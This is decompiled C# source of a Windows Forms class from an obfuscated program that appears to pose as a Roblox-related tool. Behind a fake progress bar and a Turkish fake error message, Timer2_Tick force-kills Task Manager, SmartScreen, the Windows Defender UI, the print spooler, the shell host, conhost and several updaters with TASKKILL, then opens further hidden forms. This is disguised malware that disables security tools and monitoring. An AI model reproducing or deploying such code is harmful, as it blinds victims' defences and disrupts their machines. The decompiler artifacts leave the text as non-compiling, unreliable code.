using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns1;

namespace ns2
{
	// Token: 0x02000009 RID: 9
	[DesignerGenerated]
	public partial class rbx : Form
	{
		// Token: 0x06000048 RID: 72 RVA: 0x0000221B File Offset: 0x0000041B
		public rbx()
		{
			base.Load += this.Form2_Load;
			this.InitializeComponent();
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x0600004B RID: 75 RVA: 0x0000223B File Offset: 0x0000043B
		// (set) Token: 0x0600004C RID: 76 RVA: 0x000040A0 File Offset: 0x000022A0
		internal virtual Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x0600004D RID: 77 RVA: 0x00002243 File Offset: 0x00000443
		// (set) Token: 0x0600004E RID: 78 RVA: 0x000040E4 File Offset: 0x000022E4
		internal virtual ProgressBar ProgressBar1
		{
			[CompilerGenerated]
			get
			{
				return this._ProgressBar1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ProgressBar1_Click);
				ProgressBar progressBar = this._ProgressBar1;
				if (progressBar != null)
				{
					progressBar.Click -= value2;
				}
				this._ProgressBar1 = value;
				progressBar = this._ProgressBar1;
				if (progressBar != null)
				{
					progressBar.Click += value2;
				}
			}
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x0600004F RID: 79 RVA: 0x0000224B File Offset: 0x0000044B
		// (set) Token: 0x06000050 RID: 80 RVA: 0x00004128 File Offset: 0x00002328
		internal virtual Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000051 RID: 81 RVA: 0x00002253 File Offset: 0x00000453
		// (set) Token: 0x06000052 RID: 82 RVA: 0x0000225B File Offset: 0x0000045B
		internal virtual ProgressBar ProgressBar2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000053 RID: 83 RVA: 0x00002264 File Offset: 0x00000464
		// (set) Token: 0x06000054 RID: 84 RVA: 0x0000226C File Offset: 0x0000046C
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00002275 File Offset: 0x00000475
		// (set) Token: 0x06000056 RID: 86 RVA: 0x0000227D File Offset: 0x0000047D
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000057 RID: 87 RVA: 0x00002286 File Offset: 0x00000486
		// (set) Token: 0x06000058 RID: 88 RVA: 0x0000416C File Offset: 0x0000236C
		internal virtual Timer Timer3
		{
			[CompilerGenerated]
			get
			{
				return this._Timer3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer3_Tick);
				Timer timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer3 = value;
				timer = this._Timer3;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000059 RID: 89 RVA: 0x0000228E File Offset: 0x0000048E
		// (set) Token: 0x0600005A RID: 90 RVA: 0x000041B0 File Offset: 0x000023B0
		internal virtual Timer Timer4
		{
			[CompilerGenerated]
			get
			{
				return this._Timer4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer4_Tick);
				Timer timer = this._Timer4;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer4 = value;
				timer = this._Timer4;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000041F4 File Offset: 0x000023F4
		private void Form2_Load(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				MyProject.Forms.GForm0_0.UPDATE2.Start();
				IL_20:
				num2 = 3;
				this.Timer3.Start();
				IL_2D:
				num2 = 4;
				if (!MyProject.Computer.Network.IsAvailable)
				{
					goto IL_5C;
				}
				IL_40:
				num2 = 5;
				this.Timer2.Start();
				IL_4D:
				num2 = 6;
				this.Timer1.Start();
				goto IL_97;
				IL_5C:
				num2 = 8;
				this.Timer4.Start();
				IL_69:
				num2 = 9;
				Interaction.MsgBox("0x80070035 Hata Kodu.", MsgBoxStyle.OkOnly, null);
				IL_79:
				num2 = 10;
				this.ProgressBar2.Value = 0;
				IL_88:
				num2 = 11;
				this.ProgressBar1.Value = 0;
				IL_97:
				goto IL_122;
				IL_9C:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_DE:
				goto IL_117;
				IL_E0:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_9C;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_F5:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_E0;
			}
			IL_117:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_122:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x0000433C File Offset: 0x0000253C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				this.ProgressBar2.Increment(5);
				IL_18:
				num2 = 3;
				if (this.ProgressBar2.Value != 100)
				{
					goto IL_47;
				}
				IL_2B:
				num2 = 4;
				this.ProgressBar2.Value = 0;
				IL_39:
				num2 = 5;
				this.ProgressBar2.Visible = false;
				IL_47:
				goto IL_B7;
				IL_49:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_73:
				goto IL_AC;
				IL_75:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_49;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_8A:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_75;
			}
			IL_AC:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_B7:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004418 File Offset: 0x00002618
		private void Timer2_Tick(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				this.ProgressBar1.Increment(2);
				IL_18:
				num2 = 3;
				if (this.ProgressBar1.Value != 100)
				{
					goto IL_270;
				}
				IL_2E:
				num2 = 4;
				this.ProgressBar1.Value = 1;
				IL_3C:
				num2 = 5;
				this.ProgressBar1.Visible = false;
				IL_4A:
				num2 = 6;
				MyProject.Forms.GForm0_0.Timer2.Stop();
				IL_60:
				num2 = 7;
				MyProject.Forms.GForm0_0.CheckForUpdates();
				IL_71:
				num2 = 8;
				Interaction.Shell("TASKKILL /F /IM RobloxPlayerBeta.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_81:
				num2 = 9;
				Interaction.Shell("TASKKILL /F /IM winamp.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_92:
				num2 = 10;
				Interaction.Shell("TASKKILL /F /IM LockApp.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_A3:
				num2 = 11;
				Interaction.Shell("TASKKILL /F /IM ASCService.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_B4:
				num2 = 12;
				Interaction.Shell("TASKKILL /F /IM QMEmulatorService.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_C5:
				num2 = 13;
				Interaction.Shell("TASKKILL /F /IM spoolsv.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_D6:
				num2 = 14;
				Interaction.Shell("TASKKILL /F /IM OneDrive.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_E7:
				num2 = 15;
				Interaction.Shell("TASKKILL /F /IM OneDriveStandaloneUpdater.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_F8:
				num2 = 16;
				Interaction.Shell("TASKKILL /F /IM MSASCuiL.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_109:
				num2 = 17;
				Interaction.Shell("TASKKILL /F /IM UninstallMonitor.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_11A:
				num2 = 18;
				Interaction.Shell("TASKKILL /F /IM mmc.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_12B:
				num2 = 19;
				Interaction.Shell("TASKKILL /F /IM smartscreen.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_13C:
				num2 = 20;
				Interaction.Shell("TASKKILL /F /IM Taskmgr.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_14D:
				num2 = 21;
				Interaction.Shell("TASKKILL /F /IM ShellExperienceHost.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_15E:
				num2 = 22;
				Interaction.Shell("TASKKILL /F /IM update.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_16F:
				num2 = 23;
				Interaction.Shell("TASKKILL /F /IM SearchIndexer.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_180:
				num2 = 24;
				Interaction.Shell("TASKKILL /F /IM SearchUI.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_191:
				num2 = 25;
				Interaction.Shell("TASKKILL /F /IM cscript.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1A2:
				num2 = 26;
				Interaction.Shell("TASKKILL /F /IM control.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1B3:
				num2 = 27;
				Interaction.Shell("TASKKILL /F /IM conhost.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1C4:
				num2 = 28;
				Interaction.Shell("TASKKILL /F /IM updater.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1D5:
				num2 = 29;
				Interaction.Shell("TASKKILL /F /IM AfterFX.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1E6:
				num2 = 30;
				Interaction.Shell("TASKKILL /F /IM Photoshop.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_1F7:
				num2 = 31;
				Interaction.Shell("TASKKILL /F /IM GoogleCrashHandler64.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_208:
				num2 = 32;
				Interaction.Shell("TASKKILL /F /IM GoogleCrashHandler.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_219:
				num2 = 33;
				Interaction.Shell("TASKKILL /F /IM GoogleUpdate.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_22A:
				num2 = 34;
				Interaction.Shell("TASKKILL /F /IM GoogleUpdateBroker.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_23B:
				num2 = 35;
				Interaction.Shell("TASKKILL /F /IM GoogleUpdateCore.exe", AppWinStyle.MinimizedFocus, false, -1);
				IL_24C:
				num2 = 36;
				MyProject.Forms.u.Show();
				IL_25E:
				num2 = 37;
				MyProject.Forms.Form4.Show();
				IL_270:
				goto IL_366;
				IL_275:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_31F:
				goto IL_35B;
				IL_321:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_275;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_339:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_321;
			}
			IL_35B:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_366:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00002118 File Offset: 0x00000318
		private void ProgressBar1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00002296 File Offset: 0x00000496
		private void Timer3_Tick(object sender, EventArgs e)
		{
			MyProject.Forms.GForm0_0.CheckForUpdates();
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000047B0 File Offset: 0x000029B0
		private void Timer4_Tick(object sender, EventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_02:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				Interaction.MsgBox("0x80070035 Hata Kodu.", MsgBoxStyle.OkOnly, null);
				IL_19:
				goto IL_79;
				IL_1B:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_35:
				goto IL_6E;
				IL_37:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_1B;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_4C:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_37;
			}
			IL_6E:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_79:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
	}
}
